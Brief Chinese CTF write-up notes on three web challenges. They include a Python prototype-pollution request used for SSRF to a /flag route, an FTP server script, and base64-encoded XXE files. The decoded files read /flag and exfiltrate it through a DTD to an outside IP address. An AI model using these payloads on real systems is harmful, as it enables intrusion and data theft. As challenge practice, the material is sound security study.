- > 春节没打，复现一下
- # WebVPN
	- 直接原型链污染添加127.0.0.1然后ssrf访问`/flag`路由即可
	- ```python
	  url = "http://139.224.232.162:32556"
	  
	  r = base_post(url + "/user/login", json = {
	      "username": "username",
	      "password": "password",
	  })
	  
	  r = base_post(url + "/user/info", json = {
	      "constructor": {
	          "prototype": {
	              "127.0.0.1": True
	          }
	      }
	  })
	  ```
- # Zero Link
	- > 施工中
	- 大概是[[CTFWEB/Zip]]，打一下 ((65d9fefc-9834-4cd9-bb87-ae06590683df)) 应该就行了
- # Vidarbox
	- > 施工中
	- 应该是 [[CTFWEB/XXE]] ，打一下``file://``[[伪协议]]加上 ((64301d45-52ef-4288-a4f1-f268848799a7)) 就行了
	- 需要端口21，手上暂时没有能用的vps, 先保存一下exp
		- payload: `../../xxx.com/evil16`
		- `ftp.py`
		  collapsed:: true
			- ```python
			  import os
			  from pyftpdlib import servers
			  from pyftpdlib.handlers import FTPHandler
			  from pyftpdlib.authorizers import DummyAuthorizer
			  
			  def run_ftp_server():
			      # 创建一个虚拟用户并设置密码和路径
			      authorizer = DummyAuthorizer()
			      authorizer.add_anonymous("./ftp/")
			  
			      # 实例化FTP处理程序并配置它
			      handler = FTPHandler
			      handler.passive_ports = range(3005, 3010)
			      handler.authorizer = authorizer
			  
			      # 配置服务器接口和端口
			      server = servers.FTPServer(("0.0.0.0", 21), handler)
			  
			      # 开启服务器
			      server.serve_forever()
			  
			  run_ftp_server()
			  
			  ```
		- ftp中的文件
		  collapsed:: true
			- ```shell
			  ➜  base64 -w 0 ftp/evil16.xml 
			  ADwAPwB4AG0AbAAgAHYAZQByAHMAaQBvAG4APQAiADEALgAwACIAIABlAG4AYwBvAGQAaQBuAGcAPQAiAFUAVABGAC0AMQA2AEIARQAiAD8APgAKADwAIQBEAE8AQwBUAFkAUABFACAAdQBwAGQAYQB0AGUAUAByAG8AZgBpAGwAZQAgAFsACgA8ACEARQBOAFQASQBUAFkAIAAlACAAZgBpAGwAZQAgAFMAWQBTAFQARQBNACAAIgBmAGkAbABlADoALwAvAC8AZgBsAGEAZwAiAD4ACgAgACAAPAAhAEUATgBUAEkAVABZACAAJQAgAGQAdABkACAAUwBZAFMAVABFAE0AIAAiAGgAdAB0AHAAOgAvAC8ANAAyAC4AMQA5ADQALgAxADcANgAuADEAOAAxADoANAAwADUAMwAvAGUAdgBpAGwALgBkAHQAZAAiAD4ACgAgACAAJQBkAHQAZAA7AAoAIAAgACUAcwBlAG4AZAA7AAoAXQA+AAo=⏎                                         
			  ➜  base64 -w 0 ftp/evil.dtd 
			  PCFFTlRJVFkgJSBhbGwKICAiPCFFTlRJVFkgJiN4MjU7IHNlbmQgU1lTVEVNICdodHRwOi8vNDIuMTk0LjE3Ni4xODE6NDA1My8/ZGF0YT0lZmlsZTsnPiIKPgolYWxsOwo=⏎   
			  ```